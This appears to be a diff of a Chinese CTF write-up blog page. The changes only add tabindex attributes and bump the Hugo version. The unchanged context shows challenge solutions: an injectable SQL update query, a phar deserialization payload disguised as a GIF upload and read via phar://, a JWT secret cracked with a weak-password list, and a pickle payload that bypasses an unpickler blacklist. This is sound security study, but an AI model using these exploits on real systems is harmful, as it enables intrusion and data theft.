@@ -104,10 +104,10 @@
 <p>比赛的时候没发现有源码泄露，直接看 SQL 语句可能更直观一些</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$x</span><span class="o">=</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">(</span><span class="s2">"update users set password=? where username='</span><span class="si">$username</span><span class="s2">' "</span><span class="p">,[</span><span class="s1">'s'</span><span class="p">,</span><span class="o">&amp;</span><span class="nv">$password</span><span class="p">]);</span>
+<pre class="chroma" tabindex="0"><code class="language-php" data-lang="php"><span class="nv">$x</span><span class="o">=</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">(</span><span class="s2">"update users set password=? where username='</span><span class="si">$username</span><span class="s2">' "</span><span class="p">,[</span><span class="s1">'s'</span><span class="p">,</span><span class="o">&amp;</span><span class="nv">$password</span><span class="p">]);</span>
 </code></pre></td></tr></table>
 </div>
 </div></blockquote>
@@ -115,7 +115,7 @@
 <p>打开是个文件上传，只能上传图片，并且有个 <code>vulnerable.php</code></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre class="chroma" tabindex="0"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -142,7 +142,7 @@
 </span><span class="lnt">25
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<pre class="chroma" tabindex="0"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
 <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'filename'</span><span class="p">]))</span> <span class="p">{</span>
     <span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'filename'</span><span class="p">];</span>
@@ -179,7 +179,7 @@
 <p>用如下 payload 生成 phar 包</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre class="chroma" tabindex="0"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -207,7 +207,7 @@
 </span><span class="lnt">26
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<pre class="chroma" tabindex="0"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 
 <span class="k">class</span> <span class="nc">Flag</span>
 <span class="p">{</span>
@@ -238,10 +238,10 @@
 </div><p>注意添加文件头绕过文件类型检测，生成后改后缀为 gif 上传，再用 phar 协议读取即可</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">vulnerable.php?filename=phar://upload/a.gif
+<pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback">vulnerable.php?filename=phar://upload/a.gif
 </code></pre></td></tr></table>
 </div>
 </div><h2 id="ezcode">ezcode</h2>
@@ -249,17 +249,17 @@
 <p>打开可以注册和登录，注册返回一串 JWT，刚开始毫无思路，后来给了一个 hint</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">hint ：top1000
+<pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback">hint ：top1000
 </code></pre></td></tr></table>
 </div>
 </div><p>？top1000 弱口令吗</p>
 <p>跑了一下果然跑出来了 key</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre class="chroma" tabindex="0"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -274,7 +274,7 @@
 </span><span class="lnt">13
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">jwt</span>
+<pre class="chroma" tabindex="0"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">jwt</span>
 
 <span class="n">token</span> <span class="o">=</span> <span class="s1">'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEyMzQifQ.f_U2qBN5qFbsWyIQhfIGYw2aDzX1QTKefGn-QuZ8FIw'</span>
 
@@ -296,7 +296,7 @@
 <p>用生成的 JWT 登录发现还有第二关，看一下源码有注释</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre class="chroma" tabindex="0"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -349,7 +349,7 @@
 </span><span class="lnt">51
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">want2know</span><span class="o">=</span><span class="n">xxx</span>
+<pre class="chroma" tabindex="0"><code class="language-python" data-lang="python"><span class="n">want2know</span><span class="o">=</span><span class="n">xxx</span>
 
 <span class="k">class</span> <span class="nc">RestrictedUnpickler</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">Unpickler</span><span class="p">):</span>
     <span class="n">blacklist</span> <span class="o">=</span> <span class="p">{</span>
@@ -407,12 +407,12 @@
 <p>出题壬推荐用 <a href="https://github.com/eddieivan01/pker" rel="noopener noreffer" target="_blank">pker</a> 构建序列化</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">glo_dic</span><span class="o">=</span><span class="n">INST</span><span class="p">(</span><span class="s1">'builtins'</span><span class="p">,</span><span class="s1">'globals'</span><span class="p">)</span>
+<pre class="chroma" tabindex="0"><code class="language-python" data-lang="python"><span class="n">glo_dic</span><span class="o">=</span><span class="n">INST</span><span class="p">(</span><span class="s1">'builtins'</span><span class="p">,</span><span class="s1">'globals'</span><span class="p">)</span>
 <span class="n">glo_dic</span><span class="p">[</span><span class="s1">'want2know'</span><span class="p">]</span><span class="o">=</span><span class="s1">'test'</span>
 <span class="k">return</span>
 </code></pre></td></tr></table>
@@ -420,10 +420,10 @@
 </div><p>生成 payload</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">b"(ibuiltins\nglobals\np0\n0g0\nS'want2know'\nS'test'\ns."
+<pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback">b"(ibuiltins\nglobals\np0\n0g0\nS'want2know'\nS'test'\ns."
 </code></pre></td></tr></table>
 </div>
 </div><p>base64 一下即可</p>
@@ -462,7 +462,7 @@
                 Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
             </noscript></div></article></div>
 </main><footer class="footer">
-<div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" rel="noopener noreffer" target="_blank" title="Hugo 0.85.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" rel="noopener noreffer" target="_blank" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+<div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" rel="noopener noreffer" target="_blank" title="Hugo 0.87.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" rel="noopener noreffer" target="_blank" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
 </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021</span><span class="author" itemprop="copyrightHolder"> <a href="/" target="_blank">X5tar</a></span> | <span class="license"><a href="https://creativecommons.org/licenses/by-sa/4.0/" rel="license external nofollow noopener noreffer" target="_blank">CC BY-SA 4.0</a></span></div>
 </div>
 </footer></div>
